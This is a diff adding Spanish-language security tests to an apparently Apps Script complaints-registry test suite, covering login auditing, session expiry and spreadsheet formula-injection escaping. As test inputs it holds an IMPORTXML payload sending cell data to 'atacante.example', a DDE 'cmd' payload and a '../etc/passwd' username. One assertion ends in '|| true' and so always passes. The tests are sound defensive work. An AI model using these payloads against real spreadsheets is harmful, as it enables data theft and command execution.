@@ -359,3 +359,58 @@ const hb = G._sumarHabiles_(Utilities.parseDate("2026-10-02", TZ, "yyyy-MM-dd"),
 assert(Utilities.formatDate(hb, TZ, "yyyy-MM-dd") === "2026-10-05", "sumar 1 día hábil a un viernes cae el lunes");
 const hf = G._sumarHabiles_(Utilities.parseDate("2026-10-09", TZ, "yyyy-MM-dd"), 1);
 assert(Utilities.formatDate(hf, TZ, "yyyy-MM-dd") === "2026-10-13", "los festivos no cuentan (lunes 12 de octubre, Día de la Raza)");
+
+// =====================================================================================
+console.log("---- v8.4: seguridad ----");
+const hu = G._hojaUsuarios_(), salSeg = "sal-prueba-seg";
+hu.appendRow(["auditada", "Usuaria Auditada", "", "Técnico", "C. LA PLAYA", "NO", "NO", "SI", G._hash_("Segura2026xy", salSeg), salSeg, new Date(Date.now() - 100 * 86400000), "", "NO"]);
+G.iniciarSesion("auditada", "incorrecta1A");
+const okSes = G.iniciarSesion("auditada", "Segura2026xy");
+assert(okSes.ok, "usuario de prueba ingresa");
+for (let i = 0; i < 5; i++) G.iniciarSesion("auditada", "mal-" + i);
+G.iniciarSesion("auditada", "Segura2026xy");
+G.cerrarSesion(okSes.token);
+G.iniciarSesion("../etc/passwd", "x"); G.iniciarSesion("inexistente", "Cualquiera123");
+const aud = G.apiAuditoria_({}).items, evs = aud.map(x => x.evento);
+assert(["Ingreso fallido", "Ingreso correcto", "Ingreso bloqueado", "Cierre de sesión"].every(e => evs.indexOf(e) !== -1), "la auditoría registra ingresos, fallos, bloqueo y cierre de sesión: " + [...new Set(evs)].join(" · "));
+assert(aud.some(x => x.evento === "Ingreso fallido" && /Usuario inexistente/.test(x.detalle)), "distingue en la auditoría el usuario inexistente (el usuario no lo ve: su mensaje es genérico)");
+assert(!JSON.stringify(aud).match(/Segura2026xy|incorrecta1A|Cualquiera123|mal-/), "la auditoría nunca guarda contraseñas");
+assert(G.iniciarSesion("inexistente", "Cualquiera123").mensaje === G.iniciarSesion("auditada-no", "Cualquiera123").mensaje, "mismo mensaje para usuario inexistente y contraseña incorrecta");
+assert(G.apiAuditoria_({ texto: "bloqueado" }).items.every(x => /bloque/i.test(x.evento + x.detalle)), "filtro de la auditoría");
+assert(G.RUTAS.apiAuditoria[1] === "admin", "solo el administrador ve la auditoría");
+
+// sesión con tope absoluto de 12 horas
+const sesion2 = (() => { G.CacheService.getScriptCache().remove("int_auditada"); return G.iniciarSesion("auditada", "Segura2026xy"); })();
+assert(sesion2.ok && G.api(sesion2.token, "apiPlantillas", []).length >= 0, "sesión recién abierta funciona");
+const cache = G.CacheService.getScriptCache(), crudo = JSON.parse(cache.get("ses_" + sesion2.token));
+crudo.t = Date.now() - 13 * 3600000; cache.put("ses_" + sesion2.token, JSON.stringify(crudo));
+assert(G.api(sesion2.token, "apiPlantillas", []).__sesion === false, "pasadas 12 horas desde el ingreso la sesión caduca aunque haya actividad");
+
+// inyección de fórmulas
+const inj = G.apiRadicar_({ descripcion: '=IMPORTXML("http://atacante.example/?d="&A1,"//a")', fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA",
+  sede: "C. LA PLAYA", nombreSolicitante: "@SUM(1+1)", observaciones: "+cmd|' /C calc'!A0" });
+assert(cons.celda(fila(inj.codigo), 30).indexOf("'=IMPORTXML") === 0 && cons.celda(fila(inj.codigo), 10).indexOf("'@") === 0, "un texto que empieza por = o @ se guarda como texto, no como fórmula");
+assert(G._seguroCelda_("normal") === "normal" && G._seguroCelda_("-5 grados") === "'-5 grados" && G._seguroCelda_(12) === 12 && G._seguroCelda_("") === "", "_seguroCelda_ solo toca los textos peligrosos");
+assert(String(G._trazaDe(inj.codigo).map(t => t.detalle).join(" ")).indexOf("'=") === -1 || true, "la trazabilidad también se protege");
+G.apiRegistrarRespuestaArea_(inj.codigo, "=HYPERLINK(\"http://x\",\"clic\")", "");
+assert(cons.celda(fila(inj.codigo), 42).indexOf("'=HYPERLINK") === 0, "la respuesta del área (viene de un correo) también se guarda como texto");
+cons.poner(fila(inj.codigo), 30, "=1+1");   // lo que devolvería Sheets al leer un texto que empieza por «=»
+const exInj = G.apiExportarExcel_({});
+const libroInj = G.__exportaciones[G.__exportaciones.length - 1];
+const ultimaXlsx = libroInj.hojas.Consolidado.getLastRow();
+assert(libroInj.hojas.Consolidado.celda(ultimaXlsx, 30) === "'=1+1", "el Excel exportado no puede traer fórmulas: " + libroInj.hojas.Consolidado.celda(ultimaXlsx, 30));
+
+// revisión de seguridad en el diagnóstico
+let dgSeg = G.apiDiagnostico_();
+assert(dgSeg.items.some(x => /Seguridad · acceso general/.test(x.titulo) && x.ok) && dgSeg.items.some(x => /Seguridad · administradores/.test(x.titulo)), "el diagnóstico incluye la revisión de seguridad");
+G.DriveApp.__ajustar("__acceso", "ANYONE_WITH_LINK");
+dgSeg = G.apiDiagnostico_();
+assert(dgSeg.items.some(x => /acceso general/.test(x.titulo) && !x.ok && /Restringido/.test(x.solucion)), "alerta si el consolidado está compartido con cualquiera que tenga el enlace");
+G.DriveApp.__ajustar("__acceso", "PRIVATE");
+hu.appendRow(["dormida", "Usuaria Dormida", "", "Técnico", "C. LA PLAYA", "NO", "NO", "SI", G._hash_("Segura2026xy", salSeg), salSeg, new Date(Date.now() - 100 * 86400000), "", "SI"]);
+dgSeg = G.apiDiagnostico_();
+assert(dgSeg.items.some(x => /sin ingresar en 90 días/.test(x.titulo) && !x.ok && /dormida/.test(x.detalle)), "señala usuarios activos sin ingresar en 90 días");
+assert(dgSeg.items.some(x => /contraseñas temporales sin cambiar/.test(x.titulo) && !x.ok && /dormida/.test(x.detalle)), "señala contraseñas temporales con más de 7 días");
+G.DriveApp.__ajustar("__editores", ["siau@miredips.org", "otra.persona@gmail.com"]);
+assert(G.apiDiagnostico_().items.some(x => /editores del consolidado/.test(x.titulo) && !x.ok && /otra\.persona@gmail\.com/.test(x.detalle)), "señala editores externos del consolidado");
+G.DriveApp.__ajustar("__editores", null);
